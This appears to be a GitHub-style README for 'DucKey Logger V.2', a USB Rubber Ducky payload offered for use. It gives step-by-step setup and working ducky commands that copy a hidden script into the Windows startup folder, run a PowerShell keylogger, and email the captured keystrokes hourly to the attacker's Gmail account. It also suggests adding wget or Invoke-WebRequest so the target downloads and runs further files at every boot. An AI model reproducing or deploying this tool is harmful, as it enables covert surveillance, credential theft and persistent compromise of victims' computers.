# DucKey Logger V.2 
> Chris Taylor [Blue Cosmo] | 08/24/21
---

```
:::::::::  :::    :::  ::::::::  :::    ::: :::::::::: :::   :::
:+:    :+: :+:    :+: :+:    :+: :+:   :+:  :+:        :+:   :+:
+:+    +:+ +:+    +:+ +:+        +:+  +:+   +:+         +:+ +:+  
+#+    +:+ +#+    +:+ +#+        +#++:++    +#++:++#     +#++:   
+#+    +#+ +#+    +#+ +#+        +#+  +#+   +#+           +#+    
#+#    #+# #+#    #+# #+#    #+# #+#   #+#  #+#           #+#    
#########   ########   ########  ###    ### ##########    ###     
```

## Update:
logs can now be sent every hour

## Overview:
```
DucKey Logger is a USB RubberDucky payload that uses PowerShell to log keystrokes
```
- moves *c.cmd* file to windows startup directory
- *c.cmd* will secretly run *p.ps1*
- *p.ps1* will log keystrokes and email the logs every hour and startup [via SMTP]

## Resources:
- [YouTube Video](https://youtu.be/K0g0RHSUofw)
- [YouTube Channel](https://youtube.com/cosmodiumcs)
- [Website](https://cosmodiumcs.com)

## Requirements:
- Twin-Duck firmware
- Gmail account
    - i suggest making a separate Gmail account for this payload
    - your Gmail must have [LSA Access](https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4Px2VEFPoFPEuLutMD6UhNVRyY9P3s7l-pCGA53NBqilKVrtltrfS1823x5i6k6_pSEVp6jkEW0zKQT2CHN0WXh4fvGiw) enabled
- Windows 10 Target

## Instructions:
Set-Up/Installation
1. change Gmail credentials in *p.ps1*
```powershell
# gmail credentials
$email = "example@gmail.com"
$password = "password"
```
2. change name of the SD Card in *payload.txt*
```
REM change 'L' to the name of your ducky
STRING $u=gwmi Win32_Volume|?{$_.Label -eq'L'}|select name;cd $u.name;cp .\p.ps1 $env:temp;cp .\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";cd $env:temp;echo "">"$env:UserName.log";
```
3. choose an option in *payload.txt*
```
REM comment out the option you decide NOT to use

REM STAGE 4 [OPTION1]
REM run keylogger
STRING cd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";.\c.cmd;exit

REM STAGE 4 [OPTION2]
REM restart computer
STRING shutdown /r
```
4. flash Twin-Duck firmware on to your duck
    - [Tutorial](https://youtu.be/ao32BS8fwaM?t=700)
5. load, encode, and deploy!!

## Extraneous:
The *c.cmd* attack opportunity
```
the c.cmd file runs every startup.
this means an attacker could place a
'wget' or 'Invoke-WebRequest' and have a file
be downloaded from anywhere on the internet onto the computer.
the file would then save in the startup directory,
allowing it to run every startup
```
---
- hope you enjoy the payload!!
- please subscribe to my [YouTube channel](https://youtube.com/cosmodiumcs) :)
